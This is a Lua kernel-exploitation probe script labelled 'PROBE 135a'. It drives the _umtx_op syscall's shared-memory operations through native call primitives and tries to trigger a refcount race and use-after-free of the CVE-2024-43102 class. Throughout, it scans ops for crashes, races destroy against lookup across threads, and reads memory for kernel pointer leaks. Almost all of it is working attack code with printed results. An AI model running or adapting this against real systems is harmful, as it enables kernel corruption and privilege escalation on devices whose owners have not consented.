-- CRASH_CLASS: HIGH
-- PROBE 135a: UMTX SHM refcount race (CVE-2024-43102 class)
--
-- Context: _umtx_op(454) is reachable (56i2 confirmed ops 5/21 ret=0).
-- UMTX_OP_SHM(25) was NEVER exercised with correct argument layout.
-- FreeBSD 11 shape: _umtx_op(ignored, 25, flags, key_addr, NULL)
--   flags: 0=LOOKUP, 1=CREATE, 2=DESTROY, 3=ALIVE
--
-- Phase 1: Confirm SHM create/lookup/destroy reachability
-- Phase 2: Single-threaded SHM lifecycle stress
-- Phase 3: Threaded SHM refcount race (CVE-2024-43102)
--   Thread A: SHM destroy in loop
--   Thread B: SHM lookup in loop
--   If destroy wins the race, lookup gets freed object = UAF

print("=== PROBE 135a: UMTX SHM RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
print("has_rax=" .. tostring(has_rax ~= nil))

if not has_rax then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 135a COMPLETE ===")
    return
end

local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)
local atomic_fn = libc_addrofs.Atomic_fetch_add_8

-- UMTX constants
local SYS_UMTX_OP = 454
local UMTX_OP_SHM = 25
local SHM_LOOKUP = 0
local SHM_CREATE = 1
local SHM_DESTROY = 2
local SHM_ALIVE = 3

-- ============================================================
-- PHASE 1: SHM reachability test
-- ============================================================
print("")
print("--- PHASE 1: SHM REACHABILITY ---")

-- FreeBSD 11 _umtx_op(obj, op, val, uaddr1, uaddr2)
-- For SHM: _umtx_op(ignored, UMTX_OP_SHM, flags, key_addr, NULL)
-- key_addr points to a umtx_key which is basically an address the kernel hashes

local key_buf = memory.alloc(64)
safe_wq(key_buf, uint64(0x41414141))

-- Test CREATE
local cr = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
    0,              -- obj (ignored for SHM)
    UMTX_OP_SHM,   -- op = 25
    SHM_CREATE,     -- val = flags = 1 (create)
    to_num(key_buf), -- uaddr1 = key address
    0               -- uaddr2 = NULL
))
print("SHM CREATE ret=" .. cr)

-- Test LOOKUP
local lr = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
    0, UMTX_OP_SHM, SHM_LOOKUP, to_num(key_buf), 0))
print("SHM LOOKUP ret=" .. lr)

-- Test ALIVE
local ar = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
    0, UMTX_OP_SHM, SHM_ALIVE, to_num(key_buf), 0))
print("SHM ALIVE ret=" .. ar)

-- Test DESTROY
local dr = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
    0, UMTX_OP_SHM, SHM_DESTROY, to_num(key_buf), 0))
print("SHM DESTROY ret=" .. dr)

-- LOOKUP after destroy should fail
local lr2 = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
    0, UMTX_OP_SHM, SHM_LOOKUP, to_num(key_buf), 0))
print("SHM LOOKUP after DESTROY ret=" .. lr2)

print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- If SHM is not reachable, try alternative key layouts
if cr ~= 0 then
    print("")
    print("--- PHASE 1b: ALTERNATIVE KEY LAYOUTS ---")

    -- Try with key as stack address
    local stack_key = memory.alloc(8)
    safe_wd(stack_key, 0x12345678)

    local cr2 = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
        to_num(stack_key), UMTX_OP_SHM, SHM_CREATE, to_num(stack_key), 0))
    print("SHM CREATE (obj=key) ret=" .. cr2)

    -- Try with obj as the key (some implementations use obj for the key hash)
    local cr3 = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
        to_num(key_buf), UMTX_OP_SHM, SHM_CREATE, 0, 0))
    print("SHM CREATE (uaddr1=0) ret=" .. cr3)

    -- Try with uaddr2 as output
    local out_buf = memory.alloc(8)
    safe_wq(out_buf, uint64(0))
    local cr4 = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
        0, UMTX_OP_SHM, SHM_CREATE, to_num(key_buf), to_num(out_buf)))
    print("SHM CREATE (with uaddr2) ret=" .. cr4)
    local out_val = safe_rq(out_buf)
    print("  uaddr2 after=" .. fmt_addr(out_val))

    print("canary1b: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
end

-- ============================================================
-- PHASE 2: SHM lifecycle stress (single-threaded)
-- ============================================================
print("")
print("--- PHASE 2: SHM LIFECYCLE STRESS ---")

local shm_ok = (cr == 0)
if not shm_ok then
    print("SHM CREATE failed — testing other umtx ops for baseline")

    -- Test mutex ops we know work (from 56i2)
    local mtx_buf = memory.alloc(64)
    safe_wq(mtx_buf, uint64(0))
    local m_lock = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
        to_num(mtx_buf), 5, 0, 0, 0))  -- UMTX_OP_MUTEX_LOCK
    print("MUTEX_LOCK ret=" .. m_lock)
    local mtx_word = safe_rd(mtx_buf)
    print("  mutex word=" .. string.format("0x%08X", mtx_word or 0))

    -- Try MUTEX_UNLOCK
    local m_unlock = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
        to_num(mtx_buf), 6, 0, 0, 0))  -- UMTX_OP_MUTEX_UNLOCK
    print("MUTEX_UNLOCK ret=" .. m_unlock)

    -- Test WAIT/WAKE pair
    local wait_buf = memory.alloc(8)
    safe_wd(wait_buf, 0)
    -- UMTX_OP_WAIT(2) with timeout=0 should return immediately if val matches
    local w_ret = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
        to_num(wait_buf), 2, 1, 0, 0))  -- wait for val=1 (current=0, so immediate return)
    print("UMTX_WAIT(val=1,cur=0) ret=" .. w_ret)

    -- UMTX_OP_WAKE(3)
    local wk_ret = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
        to_num(wait_buf), 3, 1, 0, 0))
    print("UMTX_WAKE ret=" .. wk_ret)

    -- Test PI mutex ops (allocate umtx_pi in kernel)
    local pi_buf = memory.alloc(64)
    safe_wq(pi_buf, uint64(0))
    local pi_lock = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
        to_num(pi_buf), 13, 0, 0, 0))  -- UMTX_OP_MUTEX_LOCK_PI (not standard, may be different)
    print("PI_MUTEX_LOCK(op=13) ret=" .. pi_lock)

    -- Try all ops 0-26 for reachability scan
    print("")
    print("--- UMTX OP SCAN (0-26) ---")
    local scan_buf = memory.alloc(64)
    for op = 0, 26 do
        safe_wq(scan_buf, uint64(0))
        local ok, ret = pcall(function()
            return to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
                to_num(scan_buf), op, 0, to_num(scan_buf), 0))
        end)
        if ok then
            print(string.format("  op %2d: ret=%d", op, ret))
        else
            print(string.format("  op %2d: CRASH", op))
        end
    end

    print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
else
    -- SHM works! Do lifecycle stress
    print("SHM reachable — running lifecycle stress")
    local stress_keys = {}
    local STRESS_ROUNDS = 50

    for i = 1, STRESS_ROUNDS do
        local k = memory.alloc(8)
        safe_wd(k, 0x1000 + i)
        stress_keys[i] = k

        -- Create
        local r = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
            0, UMTX_OP_SHM, SHM_CREATE, to_num(k), 0))
        if i <= 5 or r ~= 0 then
            print(string.format("  create[%d] ret=%d", i, r))
        end
    end

    -- Lookup all
    local lookup_ok = 0
    for i = 1, STRESS_ROUNDS do
        local r = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
            0, UMTX_OP_SHM, SHM_LOOKUP, to_num(stress_keys[i]), 0))
        if r == 0 then lookup_ok = lookup_ok + 1 end
    end
    print("Lookup success: " .. lookup_ok .. "/" .. STRESS_ROUNDS)

    -- Destroy all
    for i = 1, STRESS_ROUNDS do
        native.fcall_with_rax(stub, SYS_UMTX_OP,
            0, UMTX_OP_SHM, SHM_DESTROY, to_num(stress_keys[i]), 0)
    end
    print("Destroyed all " .. STRESS_ROUNDS)

    print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
end

-- ============================================================
-- PHASE 3: Threaded SHM refcount race
-- ============================================================
print("")
print("--- PHASE 3: THREADED SHM RACE ---")

if not shm_ok then
    print("SHM not reachable — skipping race phase")
    print("Check Phase 2 op scan for alternative kernel alloc paths")
    print("=== PROBE 135a COMPLETE ===")
    return
end

-- The race: Thread A destroys SHM entries while Thread B looks them up.
-- If destroy frees the umtx_shm_reg while lookup holds a reference,
-- we get a use-after-free.
--
-- We can't directly run destroy/lookup from threads since Thrd_create
-- takes fn(arg). But we CAN use atomic flags to coordinate:
-- 1. Pre-create many SHM entries with known keys
-- 2. Thread: atomic_add on a shared counter (as signal + busy work)
-- 3. Main: rapid destroy loop on all keys
-- 4. After race: attempt lookup on destroyed keys — if any succeed,
--    the UAF may have corrupted the registry

print("Setting up race...")

local RACE_KEYS = 100
local race_keys = {}
for i = 1, RACE_KEYS do
    local k = memory.alloc(8)
    safe_wd(k, 0x2000 + i)
    race_keys[i] = k
    native.fcall_with_rax(stub, SYS_UMTX_OP,
        0, UMTX_OP_SHM, SHM_CREATE, to_num(k), 0)
end
print("Created " .. RACE_KEYS .. " SHM entries")

-- Spray counter for thread to hammer
local race_counter = memory.alloc(8)
safe_wq(race_counter, uint64(0))

local RACE_ROUNDS = 50
local uaf_hits = 0

for round = 1, RACE_ROUNDS do
    -- Re-create entries
    for i = 1, RACE_KEYS do
        native.fcall_with_rax(stub, SYS_UMTX_OP,
            0, UMTX_OP_SHM, SHM_CREATE, to_num(race_keys[i]), 0)
    end

    -- Launch thread doing atomic adds (generates kernel contention on VM locks)
    local thr = memory.alloc(8)
    safe_wq(thr, uint64(0))
    if atomic_fn then
        pcall(thrd_create_fn, thr, atomic_fn, uint64(to_num(race_counter)))
    end

    -- Main: rapidly destroy all entries while thread runs
    for i = 1, RACE_KEYS do
        native.fcall_with_rax(stub, SYS_UMTX_OP,
            0, UMTX_OP_SHM, SHM_DESTROY, to_num(race_keys[i]), 0)
    end

    -- Check: can we still lookup any destroyed entry?
    for i = 1, RACE_KEYS do
        local lr = to_num(native.fcall_with_rax(stub, SYS_UMTX_OP,
            0, UMTX_OP_SHM, SHM_LOOKUP, to_num(race_keys[i]), 0))
        if lr == 0 then
            uaf_hits = uaf_hits + 1
            if uaf_hits <= 10 then
                print(string.format("round %d key %d: LOOKUP AFTER DESTROY = 0 (possible UAF!)",
                    round, i))
            end
        end
    end

    -- Join thread
    if atomic_fn then
        sleep(0.01, 's')
        pcall(thrd_join_fn, memory.read_qword(thr), uint64(0))
    end

    if round % 10 == 0 then
        local ok = pcall(function() return to_num(syscall.getpid()) end)
        if not ok then
            print("*** CRASH at round " .. round .. " — possible kernel corruption ***")
            break
        end
        print("  race progress: " .. round .. "/" .. RACE_ROUNDS .. " uaf_hits=" .. uaf_hits)
    end
end

print("")
print("Total UAF indicators: " .. uaf_hits)

-- Check sys 624 VM op counter for unexpected allocations
local vm_counter = to_num(native.fcall_with_rax(stub, 624))
print("sys624 VM counter=" .. vm_counter)

-- Final scan: read the counter area for kernel pointer leaks
local counter_val = safe_rq(race_counter)
print("race_counter=" .. fmt_addr(counter_val))

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 135a COMPLETE ===")
